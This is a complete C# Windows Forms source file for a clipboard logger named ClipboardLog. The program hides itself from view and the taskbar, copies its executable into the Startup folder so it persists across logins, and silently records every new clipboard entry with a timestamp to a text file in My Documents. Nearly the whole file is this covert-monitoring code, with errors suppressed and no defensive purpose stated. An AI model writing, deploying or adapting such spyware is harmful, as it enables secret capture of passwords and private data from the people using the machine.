using System;
using System.Windows.Forms;
using System.IO;

namespace ClipboardLog
{
    /*
     * The core functionality of this program is in the timer1_tick event.
     */
    public partial class Form1 : Form
    {
        // DATA MEMBERS:
        #region
        string LogFilePath = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) + "\\ClipboardLog.txt";
        string ClipboardContent = "";
        string StartupFolder = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
        #endregion

        // CONSTRUCTOR(S):
        #region
        public Form1()
        {
            InitializeComponent();

            WindowState = FormWindowState.Minimized;
            ShowInTaskbar = false;

            if (!DoesPathExist(StartupFolder + "\\ClipboardLog.EXE"))
                CopyToStartup();

            if (!DoesPathExist(LogFilePath))
                CreateFile(LogFilePath);

            timer1.Start();
        }
        #endregion

        // EVENTS:
        #region
        /*
         * This is basically the whole core of the program, it's this little timer here.
         * Each tick it checks to see if any 'new' text entered the clipboard, 
         * if so, then just append that text to the ClipboardLog.txt file
         */
        private void timer1_Tick(object sender, EventArgs e)
        {
            if (Clipboard.ContainsText())
            {
                if (ClipboardContent != Clipboard.GetText())
                {
                    AppendClipboardTextToLogFile();
                    ClipboardContent = Clipboard.GetText();
                }
            }
        }
        #endregion

        // METHODS:
        #region
        private void CopyToStartup()
        {
            try
            {
                string exePath = Application.ExecutablePath;
                string exeName = Path.GetFileName(exePath);
                File.Copy(exePath, StartupFolder + "\\" + exeName);
            }
            catch { }
        }
        private void CreateFile(string path)
        {
            try
            {
                File.Create(path).Close();
            }
            catch { }
        }
        private bool DoesPathExist(string path)
        {
            return (File.Exists(path) || Directory.Exists(path));
        }
        private void AppendClipboardTextToLogFile()
        {
            try
            {
                if (File.Exists(LogFilePath))
                {
                    FileStream fs = File.Open(LogFilePath, FileMode.Append);
                    StreamWriter sw = new StreamWriter(fs);
                    sw.WriteLine("X----------------------------------------------------------------------------------X");
                    sw.WriteLine(DateTime.Now.ToString());
                    sw.WriteLine();
                    sw.WriteLine(Clipboard.GetText());
                    sw.WriteLine("X----------------------------------------------------------------------------------X");
                    sw.Close();
                    fs.Close();
                }
            }
            catch { }
        }
        #endregion
    }
}
